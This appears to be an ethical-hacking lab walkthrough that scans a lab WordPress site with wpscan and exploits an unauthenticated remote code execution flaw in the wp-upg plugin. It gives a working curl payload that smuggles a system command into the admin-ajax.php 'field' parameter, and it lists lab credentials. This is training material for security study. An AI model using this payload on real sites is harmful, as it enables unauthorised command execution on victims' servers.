
switch to the Windows  2022 machine and login with CEH\Administrator .

Click Type here to search field on the Desktop, search for wampserver64 in the search bar and select Wampserver64 from the results.

Now, in the right corner of Desktop, click the Show hidden icons icon, observe that the WampServer icon appears.

Wait for this icon to turn green, which indicates that the WampServer is successfully running.

Now, open any web browser, and go to http://10.10.1.22:8080/CEH/wp-login.php? (here, we are using Mozilla Firefox).

A WordPress webpage appears. Type Username or Email Address and Password as admin and qwerty@123. Click the Log In button.

Assume that you have installed and configured User Post Gallery plugin

Hover your mouse cursor on Plugins in the left pane and click Installed Plugins, as shown in the screenshot.

In the Plugins page, observe that User Post Gallery is installed. Click Activate under the User Post Gallery plugin to activate the plugin.

switch to the Parrot  machine.

Open Mozilla Firefox web browser and go to https://wpscan.com/ and login to the wpscan account that you have created in previous task.

You get signed in successfully in the website. Now, click the Get Started button and click Start for free button under Researcher section.

The Edit Profile page appears; in the API Token section and observe the API Token. Note down or copy this API Token; we will use this token in the later steps.

Close the Firefox browser window.

In the Parrot Security machine, open a Terminal window and execute sudo su to run the programs as a root user (When prompted, enter the password toor).

Now, run cd command to jump to the root directory.

In the Terminal window, run wpscan --url http://10.1XXX:8080/CEH --api-token API Token from Step 13 command.

The result appears, displaying detailed information regarding the target website.

Scroll down to the Plugin(s) Identified section, and observe the installed vulnerable plugins (wp-upg) on the target website.

In the Plugin(s) Identified section, within the context of the wp-upg plugin, an Unauthenticated Remote Code Execution (RCE) vulnerability has been detected as shown in the screenshot.

In this task, we will exploit the RCE vulnerability present in the wp-upg plugin.

To perform RCE attack, run curl -i 'http://10.XXX/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' command.

This curl command exploits a WordPress plugin vulnerability by sending a malicious request to the admin-ajax.php file, allowing an attacker to execute arbitrary system commands via the exec function, potentially leading to remote code execution.

In the last step, whoami command was executed, yielding the outcome nt authority\ \system

This concludes the demonstration of performing RCE attack.